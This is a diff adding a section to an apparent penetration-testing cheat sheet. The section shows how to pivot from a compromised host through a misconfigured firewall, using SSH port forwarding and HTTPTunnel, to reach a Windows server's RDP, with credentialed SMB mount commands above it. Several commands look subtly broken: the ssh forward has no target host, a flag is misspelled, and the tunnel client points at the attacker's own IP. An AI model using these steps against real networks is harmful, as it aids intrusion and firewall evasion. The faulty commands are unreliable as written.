@@ -2439,3 +2439,36 @@ smbclient -L 10.10.10.10 --port=4444
 # mount share
 sudo mount -t cifs -o port=4444 //10.10.10.10/Share -o username=Administrator,password=passwd! /mnt/share
 ```
+
+## HTTPTunneling Through Deep Packet Inspection
+* [HTTPTunnel](http://http-tunnel.sourceforge.net/)
+
+Assuming the following setup:
+
+Attacker Machine (Kali): 10.10.10.10
+Compromised Machine: 10.10.10.20, additional interface to 192.168.1.0/24
+Windows Server: 192.168.1.100
+Firewall incoming traffic to ports 80,443 and 4444 (misconfigured)
+Objective: Get a RDP Session to the Windows Server
+
+1. Setup local forward on compromised machine
+```
+ssh -L 0.0.0.0:8888:192.168.1.100:3389
+```
+2. Setup HTTPTunnel server on compromised machine (hts)
+```
+hts --foward-port localhost:8888 4444
+```
+3. Setup HTTPTunnel client on attacker machine
+```
+htc --forward-port 8080 10.10.10.10:4444
+```
+4. Connect with a RDP tool to 127.0.0.1:8080 (attacker machine)
+
+
+
+
+
+
+
+
